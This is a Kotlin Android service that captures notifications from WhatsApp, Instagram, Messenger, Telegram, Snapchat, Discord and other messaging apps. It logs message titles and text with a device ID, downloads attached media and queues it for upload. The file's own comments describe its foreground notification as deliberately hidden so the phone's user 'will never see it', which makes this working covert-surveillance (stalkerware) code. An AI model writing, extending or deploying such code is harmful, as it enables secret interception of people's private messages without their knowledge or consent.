package com.chats.capture.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import androidx.core.app.NotificationCompat
import com.chats.capture.CaptureApplication
import com.chats.capture.CaptureApplication.Companion.NOTIFICATION_CHANNEL_ID
import com.chats.capture.database.NotificationDao
import com.chats.capture.database.MediaFileDao
import com.chats.capture.managers.MediaUploadManager
import com.chats.capture.models.MediaFile
import com.chats.capture.models.NotificationData
import com.chats.capture.models.UploadStatus
import com.chats.capture.ui.MainActivity
import com.chats.capture.utils.MediaDownloader
import com.chats.capture.utils.MediaExtractor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import timber.log.Timber

class NotificationCaptureService : NotificationListenerService() {
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private lateinit var notificationDao: NotificationDao
    private lateinit var mediaFileDao: MediaFileDao
    private lateinit var mediaExtractor: MediaExtractor
    private lateinit var mediaDownloader: MediaDownloader
    private lateinit var mediaUploadManager: MediaUploadManager
    private lateinit var deviceRegistrationManager: com.chats.capture.managers.DeviceRegistrationManager
    
    private val targetAppPackages = setOf(
        "com.whatsapp",
        "com.instagram.android",
        "com.facebook.katana",
        "com.facebook.orca",
        "org.telegram.messenger",
        "com.snapchat.android",
        "com.twitter.android",
        "com.discord",
        "com.viber.voip",
        "com.skype.raider"
    )
    
    override fun onCreate() {
        super.onCreate()
        Timber.d("NotificationCaptureService created")
        
        val database = (application as CaptureApplication).database
        notificationDao = database.notificationDao()
        mediaFileDao = database.mediaFileDao()
        
        mediaExtractor = MediaExtractor(this)
        mediaDownloader = MediaDownloader(this)
        val chatDao = database.chatDao()
        mediaUploadManager = MediaUploadManager(this, mediaFileDao, notificationDao, chatDao)
        deviceRegistrationManager = com.chats.capture.managers.DeviceRegistrationManager(this)
        
        startForegroundService()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Timber.d("NotificationCaptureService destroyed")
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)
        
        if (!isTargetApp(sbn.packageName)) {
            return
        }
        
        serviceScope.launch {
            try {
                captureNotification(sbn)
            } catch (e: Exception) {
                Timber.e(e, "Error capturing notification")
            }
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)
        // Handle notification removal if needed
    }
    
    private suspend fun captureNotification(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            val title = extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString()
            val text = extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            val appName = getAppName(sbn.packageName)
            
            // Extract media URLs or file paths
            val mediaSources = mediaExtractor.extractMediaFromNotification(sbn)
            val downloadedMediaFiles = mutableListOf<String>()
            
            // Process each media source sequentially to ensure all are processed
            mediaSources?.forEach { mediaSource ->
                try {
                    // Check if it's already a local file path or a URL
                    val isLocalFile = mediaSource.startsWith("/") || mediaSource.startsWith("file://")
                    
                    if (isLocalFile) {
                        // Already a local file (from bitmap extraction)
                        val filePath = mediaSource.removePrefix("file://")
                        val file = java.io.File(filePath)
                        if (file.exists() && file.length() > 0) {
                            // Calculate checksum and determine MIME type
                            val checksum = calculateFileChecksum(file)
                            val mimeType = determineMimeType(file)
                            
                            // Save media file to database
                            val mediaFile = MediaFile(
                                notificationId = sbn.id.toString(),
                                appPackage = sbn.packageName,
                                localPath = filePath,
                                fileSize = file.length(),
                                mimeType = mimeType,
                                checksum = checksum,
                                uploadStatus = UploadStatus.PENDING
                            )
                            mediaFileDao.insertMediaFile(mediaFile)
                            downloadedMediaFiles.add(filePath)
                            
                            Timber.d("Media file saved: $filePath, size: ${file.length()}, type: $mimeType")
                        }
                    } else {
                        // It's a URL - download it (await the result)
                        val downloadResult = mediaDownloader.downloadMedia(mediaSource, sbn.id.toString())
                        downloadResult.fold(
                            onSuccess = { downloadedMedia ->
                                // Save media file to database
                                val mediaFile = MediaFile(
                                    notificationId = sbn.id.toString(),
                                    appPackage = sbn.packageName,
                                    localPath = downloadedMedia.localPath,
                                    fileSize = downloadedMedia.fileSize,
                                    mimeType = downloadedMedia.mimeType,
                                    checksum = downloadedMedia.checksum,
                                    uploadStatus = UploadStatus.PENDING
                                )
                                mediaFileDao.insertMediaFile(mediaFile)
                                downloadedMediaFiles.add(downloadedMedia.localPath)
                                
                                Timber.d("Media downloaded: ${downloadedMedia.localPath}, size: ${downloadedMedia.fileSize}, type: ${downloadedMedia.mimeType}")
                            },
                            onFailure = { error ->
                                Timber.e(error, "Failed to download media: $mediaSource")
                            }
                        )
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error processing media: $mediaSource")
                }
            }
            
            // Save notification to database (with deduplication)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            // Check for duplicate notification (same app, title, text within 2 seconds)
            val duplicate = notificationDao.findDuplicateNotification(
                sbn.packageName,
                title,
                text,
                sbn.postTime
            )
            
            if (duplicate == null) {
                val notificationData = NotificationData(
                    deviceId = deviceId,
                    appPackage = sbn.packageName,
                    appName = appName,
                    title = title,
                    text = text,
                    timestamp = sbn.postTime,
                    mediaUrls = downloadedMediaFiles.ifEmpty { null },
                    synced = false
                )
                
                notificationDao.insertNotification(notificationData)
                com.chats.capture.utils.AppStateManager.incrementNotificationCount(this)
                Timber.d("Notification captured: ${notificationData.id}")
            } else {
                Timber.v("Duplicate notification skipped: ${duplicate.id}")
            }
            
            // Trigger media upload if any
            if (downloadedMediaFiles.isNotEmpty()) {
                serviceScope.launch {
                    mediaUploadManager.uploadPendingMediaFiles(limit = 5)
                }
            }
            
        } catch (e: Exception) {
            Timber.e(e, "Error processing notification")
        }
    }
    
    private fun isTargetApp(packageName: String): Boolean {
        return targetAppPackages.any { packageName.startsWith(it) }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    private fun calculateFileChecksum(file: java.io.File): String {
        val md = java.security.MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                md.update(buffer, 0, bytesRead)
            }
        }
        return md.digest().joinToString("") { "%02x".format(it) }
    }
    
    private fun determineMimeType(file: java.io.File): String {
        val extension = file.extension.lowercase()
        return when (extension) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "webp" -> "image/webp"
            "mp4" -> "video/mp4"
            "webm" -> "video/webm"
            "mp3" -> "audio/mpeg"
            "ogg" -> "audio/ogg"
            "wav" -> "audio/wav"
            "m4a" -> "audio/mp4"
            else -> "application/octet-stream"
        }
    }
    
    private fun startForegroundService() {
        // Create completely silent and invisible notification
        // Required for foreground service but user will never see it
        // Using transparent icon and empty content to make it invisible
        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("") // Empty title - completely invisible
            .setContentText("") // Empty text - completely invisible
            .setSmallIcon(android.R.drawable.ic_menu_compass) // Minimal system icon - less visible
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority - won't show
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden everywhere
            .setShowWhen(false) // Don't show timestamp
            .setSilent(true) // Completely silent
            .setCategory(NotificationCompat.CATEGORY_SERVICE) // System service category
            .setLocalOnly(true) // Only local, not synced
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_SERVICE_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_SERVICE_ID, notification)
        }
    }
    
    companion object {
        private const val NOTIFICATION_SERVICE_ID = 1001
    }
}
